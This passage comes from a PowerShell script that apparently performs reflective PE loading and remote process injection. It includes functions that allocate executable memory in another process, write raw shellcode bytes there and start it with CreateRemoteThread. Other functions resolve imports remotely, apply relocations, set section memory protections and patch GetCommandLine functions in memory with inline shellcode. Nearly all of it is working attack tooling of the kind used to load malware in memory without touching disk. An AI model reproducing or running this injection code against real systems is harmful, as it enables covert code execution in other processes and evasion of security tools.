			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw ""Unable to allocate memory in the remote process for shellcode""
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw ""Unable to write shellcode to remote process memory.""
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
			}
			
			
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw ""Call to ReadProcessMemory failed""
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw ""Call to GetExitCodeThread failed""
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   
        
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw ""Unable to allocate memory in the remote process""
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw ""Unable to write DLL path to remote process memory""
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw ""Didn't write the expected amount of bytes when writing a DLL path to load to the remote process""
		    }
        }
        
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""kernel32.dll"")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, ""GetProcAddress"") 

		
		
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process for the return value of GetProcAddress""
		}
		
		
		
		
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw ""Unable to allocate memory in the remote process for shellcode""
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw ""Unable to write shellcode to remote process memory.""
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw ""Call to CreateRemoteThread to call GetProcAddress failed.""
		}
		
		
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw ""Call to ReadProcessMemory failed""
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			
			
			
			
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString ""Copy-Sections::MarshalCopy"" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString ""Copy-Sections::Memset"" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true 
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				
				
				
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					
					Throw ""Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo""
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose ""Done importing DLL imports""
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw ""Error importing DLL, DLLName: $ImportDllPath""
				}
				
				
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) 
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					
					
					
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff 
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw ""New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath""
                        }
                        else
                        {
						    Throw ""New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath""
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    
                    
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString ""Update-MemoryProtectionFlags::VirtualProtect"" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw ""Unable to change memory protection""
			}
		}
	}
	
	
	
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke(""Kernel32.dll"")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw ""Kernel32 handle null""
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke(""KernelBase.dll"")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw ""KernelBase handle null""
		}

		
		
		
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineA"")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, ""GetCommandLineW"")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw ""GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)""
		}

		
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw ""Call to VirtualProtect failed""
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
